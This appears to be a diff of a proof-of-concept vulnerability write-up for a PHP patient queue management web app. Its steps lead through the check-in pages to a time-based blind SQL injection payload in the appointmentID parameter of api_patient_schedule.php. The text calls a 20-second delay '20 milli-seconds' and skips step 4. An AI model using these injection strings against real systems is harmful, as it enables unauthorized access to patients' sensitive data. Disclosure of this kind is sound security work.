@@ -48,43 +48,47 @@ pqms/php/api_patient_schedule.php?appointmentID
    ```
    http://localhost/pqms/
    ```
-   ![Description of image](https://github.com/rayficom/Proof-of-Concept/edit/main/20260218/20260218-pqms-001.png)
+   ![Description of image](20260218-pqms-001.png)
 
 2. Select either options
    ```
    http://localhost/pqms/visit.php
    ```
+   ![Description of image](20260218-pqms-002.png)
 
 3. Search the patient by using patient's phone number:
    ```
    http://localhost/pqms/patient-search.php
    ```
-
-4. Click Proceed to Check-in:
+   ![Description of image](20260218-pqms-003.png)
+   
+5. Click Proceed to Check-in:
    ```
    http://localhost/pqms/checkin.php?patient_id=11
    ``` 
-
-5. Use the following SQL payload (1):
+   ![Description of image](20260218-pqms-004.png)
+   
+6. Use the following SQL payload (1):
    ```
    AppointmentId: '%2b(select*from(select(sleep(0)))a)%2b'
    ```
-
-6. Attacker can manuplate the database to delay in 0 milli-second and access the unauthorized sensitive information.
+   
+7. Attacker can manuplate the database to delay in 0 milli-second and access the unauthorized sensitive information.
    ```
    http://localhost/pqms/php/api_patient_schedule.php?appointmentID='%2b(select*from(select(sleep(0)))a)%2b'
    ``` 
-
-7. Use the following SQL payload (2):
+   ![Description of image](20260218-pqms-005.png)
+   
+8. Use the following SQL payload (2):
    ```
    AppointmentId: '%2b(select*from(select(sleep(20)))a)%2b'
    ```
 
-8. Attacker can manuplate the database to delay in 20 milli-seconds and access the unauthorized sensitive information.
+9. Attacker can manuplate the database to delay in 20 milli-seconds and access the unauthorized sensitive information.
    ```
    http://localhost/pqms/php/api_patient_schedule.php?appointmentID='%2b(select*from(select(sleep(20)))a)%2b'
    ``` 
-
+   ![Description of image](20260218-pqms-006.png)
 
 
 
